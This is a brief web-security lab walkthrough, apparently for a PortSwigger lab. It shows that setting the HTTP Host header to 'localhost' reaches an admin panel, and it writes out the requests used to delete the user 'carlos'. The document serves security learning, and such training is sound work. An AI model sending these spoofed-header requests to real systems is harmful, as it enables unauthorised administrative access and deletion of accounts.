# Host Header Authentication Bypass

This lab decides a user's privilege level based on the HTTP `Host` header.

**Goal:** Reach the admin panel and delete Carlos's account.

---

**Reference:**
- https://portswigger.net/web-security/host-header/exploiting

pic 1

---

Requesting `/admin` directly returns an error:

pic 2

Setting the `Host` header to "localhost" grants access instead:

```
GET /admin HTTP/2
Host: localhost
...
```

pic 3

The target user can then be deleted:

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
...
```

pic 4
